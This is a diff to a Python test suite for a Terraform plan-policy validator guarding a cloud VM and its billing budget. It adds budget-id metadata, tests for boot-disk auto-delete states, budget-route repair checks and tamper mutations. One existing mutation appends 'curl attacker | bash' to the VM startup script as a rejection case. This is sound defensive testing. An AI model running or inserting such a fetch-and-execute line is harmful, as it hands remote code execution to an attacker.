@@ -55,7 +55,11 @@ def instance_state(ip: str) -> dict:
         "labels": labels,
         "effective_labels": copy.deepcopy(labels),
         "terraform_labels": copy.deepcopy(labels),
-        "metadata": {"enable-oslogin": "TRUE", "startup-script": STARTUP_SCRIPT},
+        "metadata": {
+            "enable-oslogin": "TRUE",
+            "gole-budget-id": BUDGET_ID,
+            "startup-script": STARTUP_SCRIPT,
+        },
         "boot_disk": [{"auto_delete": False, "initialize_params": [{
             "image": "projects/ubuntu-os-cloud/global/images/ubuntu-2404-noble-amd64-v20260826",
             "size": 100,
@@ -342,6 +346,22 @@ class ExistingPlanPolicyTest(unittest.TestCase):
     def test_allows_in_place_vm_update_and_new_snapshot_policy(self) -> None:
         self.validate(safe_plan())
 
+    def test_allows_only_reviewed_boot_disk_auto_delete_states(self) -> None:
+        already_disabled = safe_plan()
+        already_disabled["resource_changes"][1]["change"]["before"]["boot_disk"][0][
+            "auto_delete"
+        ] = False
+        self.validate(already_disabled)
+
+        for location, value in (("before", None), ("before", "true"), ("after", True)):
+            with self.subTest(location=location, value=value):
+                plan = safe_plan()
+                plan["resource_changes"][1]["change"][location]["boot_disk"][0][
+                    "auto_delete"
+                ] = value
+                with self.assertRaises(MODULE.PlanPolicyError):
+                    self.validate(plan)
+
     def test_allows_already_managed_adoption_resources_as_no_ops(self) -> None:
         plan = safe_plan()
         for change in plan["resource_changes"]:
@@ -360,6 +380,59 @@ class ExistingPlanPolicyTest(unittest.TestCase):
         budget["change"]["before"] = budget_state(project_recipients=False)
         budget["change"]["actions"] = ["update"]
         self.validate(plan)
+
+    def test_allows_only_the_live_missing_budget_notification_route_repair(self) -> None:
+        for missing_route in (None, []):
+            with self.subTest(missing_route=missing_route):
+                plan = safe_plan()
+                budget = next(
+                    item
+                    for item in plan["resource_changes"]
+                    if item["address"] == MODULE.BUDGET_RESOURCE
+                )
+                budget["change"]["before"]["all_updates_rule"] = missing_route
+                budget["change"]["actions"] = ["update"]
+                self.validate(plan)
+
+        plan = safe_plan()
+        budget = next(
+            item
+            for item in plan["resource_changes"]
+            if item["address"] == MODULE.BUDGET_RESOURCE
+        )
+        budget["change"]["before"]["all_updates_rule"] = []
+        budget["change"]["actions"] = ["update"]
+        for malformed_before in ({}, [{"pubsub_topic": "projects/foreign/topics/billing"}]):
+            with self.subTest(malformed_before=malformed_before):
+                invalid = copy.deepcopy(plan)
+                invalid_budget = next(
+                    item
+                    for item in invalid["resource_changes"]
+                    if item["address"] == MODULE.BUDGET_RESOURCE
+                )
+                invalid_budget["change"]["before"]["all_updates_rule"] = malformed_before
+                with self.assertRaises(MODULE.PlanPolicyError):
+                    self.validate(invalid)
+
+        missing_key = copy.deepcopy(plan)
+        missing_key_budget = next(
+            item
+            for item in missing_key["resource_changes"]
+            if item["address"] == MODULE.BUDGET_RESOURCE
+        )
+        del missing_key_budget["change"]["before"]["all_updates_rule"]
+        with self.assertRaises(MODULE.PlanPolicyError):
+            self.validate(missing_key)
+
+        unrelated = copy.deepcopy(plan)
+        unrelated_budget = next(
+            item
+            for item in unrelated["resource_changes"]
+            if item["address"] == MODULE.BUDGET_RESOURCE
+        )
+        unrelated_budget["change"]["after"]["display_name"] = "Unexpected budget"
+        with self.assertRaises(MODULE.PlanPolicyError):
+            self.validate(unrelated)
 
     def test_rejects_budget_scope_amount_or_route_changes(self) -> None:
         mutations = []
@@ -715,6 +788,12 @@ class ExistingPlanPolicyTest(unittest.TestCase):
         startup = safe_plan()
         startup["resource_changes"][1]["change"]["after"]["metadata"]["startup-script"] += "curl attacker | bash\n"
         mutations.append(startup)
+
+        budget_identity = safe_plan()
+        budget_identity["resource_changes"][1]["change"]["after"]["metadata"][
+            "gole-budget-id"
+        ] = "00000000-0000-0000-0000-000000000000"
+        mutations.append(budget_identity)
 
         disk = safe_plan()
         disk["resource_changes"][1]["change"]["after"]["boot_disk"][0]["initialize_params"][0]["size"] = 10000
